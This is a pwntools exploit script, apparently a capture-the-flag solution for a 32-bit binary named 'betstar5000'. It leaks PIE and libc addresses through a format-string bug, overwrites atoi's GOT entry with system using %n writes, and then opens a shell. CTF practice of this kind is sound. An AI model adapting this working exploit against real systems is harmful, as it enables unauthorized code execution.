'''
Author: Samrito
Date: 2022-02-11 21:02:03
LastEditors: Samrito
LastEditTime: 2022-02-14 22:00:23
'''
from click import edit
from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'debug'

io = process(argv='./betstar5000')
libc = ELF('./libc-2.27.so')
elf = ELF('./betstar5000')


def menu(id):
    io.recvuntil(b'5. End the game\n')
    io.sendline(id)


def leakinfo():
    menu(b'1')
    io.sendline(b'1')
    io.sendline(b'50')
    io.recvuntil(b'And the winner is *drumroll*: ')
    return io.recvline()[:-1]


def fmtexploit():
    menu(b'1')
    io.sendline(b'1')
    io.sendline(b'50')


def addPlayer(name):
    menu(b'3')
    io.recvuntil(b'Welcome new player!\n')
    io.sendline(name)


def changeName(id, newName):
    menu(b'4')
    io.recvuntil(b'Which player index should i change: \n')
    io.sendline(id)
    io.sendline(newName)


#pie offset is 0x105c
#libc offset is 0x1d85c0

io.sendline(b'1')
io.sendline(b'%x.%x')
res = leakinfo()
pie_base = int(res.split(b'.')[0], 16) - 0x105c
libc_base = int(res.split(b'.')[1], 16) - 0x1d85c0

system_addr = libc_base + libc.symbols['system']
atoi_got_addr = elf.got['atoi'] + pie_base

num1 = (system_addr & 0xffff) - 8
num2 = ((system_addr & 0xffff0000) >> 16) - (system_addr & 0xffff)

addPlayer(b'@' * 12)
addPlayer(b'@' * 12)

payload = flat([
    atoi_got_addr, atoi_got_addr + 2, '%' + str(num1) + 'c', b'%19$n',
    '%' + str(num2) + 'c', '%20$n'
])

changeName(b'1', payload[0:17])
changeName(b'2', payload[16:])

menu(b'1')
io.sendline(b'2')
io.recvuntil(
    b'Each player makes a bet between 0 -> 100, the one who lands closest win the round!\n'
)

io.sendline(b'500')  #make sure id 1 win
io.sendline(b'50')
menu(b'1')
io.sendline(b'sh')
io.interactive()